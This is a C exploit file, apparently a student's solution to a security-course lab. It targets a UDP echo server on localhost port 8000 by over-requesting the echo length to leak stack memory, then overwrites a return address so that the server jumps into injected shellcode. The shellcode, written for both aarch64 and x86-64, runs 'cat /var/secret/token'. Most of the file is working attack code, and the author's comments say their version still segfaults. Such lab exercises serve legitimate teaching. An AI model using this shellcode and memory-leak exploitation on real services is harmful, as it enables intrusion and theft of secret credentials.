/* exploit.c  */

/* Creates a file containing code for executing "cat /var/secret/token" */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#ifdef __aarch64__
char shellcode[] =
  "\x20\x01\x00\x10" // adr x0, .+36
  "\x61\x01\x00\x10" // adr x1, .+44
  "\x03\x02\x00\x10" // adr x3, .+64
  "\x23\x00\x00\xf9" // str x3, [x1, #0]
  "\xe3\x01\x00\x10" // adr x3, .+60
  "\x23\x04\x00\xf9" // str x3, [x1, #8]
  "\x02\x00\x80\xd2" // mov x2, #0
  "\xa8\x1b\x80\xd2" // mov x8, #221 (execve)
  "\x01\x00\x00\xd4" // svc 0 (syscall)
  "/bin/cat"
  "\x00\x00\x00\x00"
  "\x00\x00\x00\x00"
  "\x00\x00\x00\x00"
  "\x00\x00\x00\x00"
  "\x00\x00\x00\x00"
  "\x00\x00\x00\x00"
  "\x00\x00\x00\x00"
  "foo\x00"
  "/var/secret/token"
  "\x00\x00\x00\x00";
#else
char shellcode[]=
  "\x48\x31\xc0"				/* xor     rax,rax			*/
  "\x50"					/* push    rax				*/
  "\x48\xbb\x2f\x2f\x2f\x74\x6f\x6b\x65\x6e"	/* mov     rbx,0x6e656b6f742f2f2f	*/
  "\x53"					/* push    rbx				*/
  "\x48\xbb\x73\x65\x63\x72\x65\x74\x2f\x2f"	/* mov     rbx,0x2f2f746572636573	*/
  "\x53"					/* push    rbx				*/
  "\x48\xbb\x2f\x76\x61\x72\x2f\x2f\x2f\x2f"	/* mov     rbx,0x2f2f2f2f7261762f	*/
  "\x53"					/* push    rbx				*/
  "\x48\x89\xe1"				/* mov     rcx,rsp			*/
  "\x50"					/* push    rax				*/
  "\x48\xbb\x2f\x62\x69\x6e\x2f\x63\x61\x74"	/* mov     rbx,0x7461632f6e69622f	*/
  "\x53"					/* push    rbx				*/
  "\x48\x89\xe7"				/* mov     rdi,rsp			*/
  "\x50"					/* push    rax				*/
  "\x51"					/* push    rcx				*/
  "\x57"					/* push    rdi				*/
  "\x48\x31\xd2"				/* xor     rdx,rdx			*/
  "\x48\x89\xe6"				/* mov     rsi,rsp			*/
  "\xb0\x3b"					/* mov     al,0x3b			*/
  "\x0f\x05"					/* syscall				*/
;
#endif

typedef struct {
  int                 sockfd;
  struct sockaddr_in  srv_addr;
  struct sockaddr*    srv_saddr;
  socklen_t           srv_addr_size;
} connection;

connection* create_connection();

/*
 * This sends a message to the target, and waits for a response.
 *
 * msg      an array of bytes, which may have embedded NULLs!
 * msglen   the length of msg, which may not be the same as strlen(msg)
 * echolen  the length of msg to echo back to the client
 * conn     how to connect to the target
 * resp     an array of bytes, containing the response from the target
 * resplen  the length of the resp buffer
 *
 * This returns the number of bytes written to resp.
 */
int send_message(void* msg, int msglen, uint16_t echolen,
                 connection* conn, void* resp, int resplen);

int main(int argc, char **argv)
{
  connection* conn;
  ssize_t rcvsize;

  char msg[517];
  char resp[517];

  /* Initialize msg with 0x0 */
  memset(msg, 0x0, 517);

  /* Create a UDP socket to communicate with the target server. */
  conn = create_connection();

  /* Send a message to the server, and collect the response, which should
     be the first 5 characters. */  


  rcvsize = send_message("Hello, world!",16,72,conn,resp,sizeof(resp)); // OG 

    /* original line is 14,5
      rcvsize = send_message("Hello, world!",14,5,conn,resp,sizeof(resp)); */

  printf("received %ld bytes from hello world\n",rcvsize);
  printf("RESP: %s\n",resp);

  /* kelly: put your code here */
  ///memset(msg, 0x0, 517);

///////ORIGINAL!!!! where it looks like its correct but still seg fault :)))))))
  uint64_t raddr;
  memcpy(&raddr, resp+64, 8); 
  memcpy(msg, resp, 72);
  uint64_t temp = raddr-16;
  memcpy(msg+72, &temp, 8); 
  memcpy(msg+80, shellcode, sizeof(shellcode));
  send_message(msg, sizeof(shellcode)+72+8, sizeof(shellcode)+72+8, conn, resp, sizeof(resp));



////////////////////////////////end////////////////////////////////

  /* TODO: put your code here */





  /* gist for copying one byte array into another:
  memcpy( dest+offset, src, num_bytes );
   */

  /* gist for writing a 64-bit unsigned int into a byte array
   * for a little-endian target (regardless of our endianness):
  uint64_t num;
  uint64_t leNum = htole64(num);
  memcpy( dest+offset, &leNum, 8 );
   */

  /* gist for converting a hexadecimal string to a 64-bit unsigned int:
  uint64_t a = strtoul(s,NULL,16);
   */
  return 0;
}

connection* create_connection() {
  connection* retval = malloc(sizeof(connection));
  retval->sockfd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
  bzero(&retval->srv_addr, sizeof(retval->srv_addr));
  retval->srv_addr.sin_family = AF_INET;
  retval->srv_addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  retval->srv_addr.sin_port = htons(8000);
  retval->srv_addr_size = sizeof(retval->srv_addr);
  retval->srv_saddr = (struct sockaddr*) &(retval->srv_addr);
  return retval;
}

int send_message(void* msg, int msglen, uint16_t echolen,
                 connection* conn, void* resp, int resplen) {
  ssize_t rcvsize;
  void* full = malloc(msglen+2);
  uint16_t be_len = htobe16(echolen);
  memcpy(full, &be_len, 2);
  memcpy(full+2, msg, msglen);
  sendto(conn->sockfd, full, msglen+2, 0, conn->srv_saddr, conn->srv_addr_size);
  bzero(resp, sizeof(resp));
  rcvsize = recvfrom(conn->sockfd, resp, resplen, MSG_WAITALL, NULL, NULL);
  return rcvsize;
}
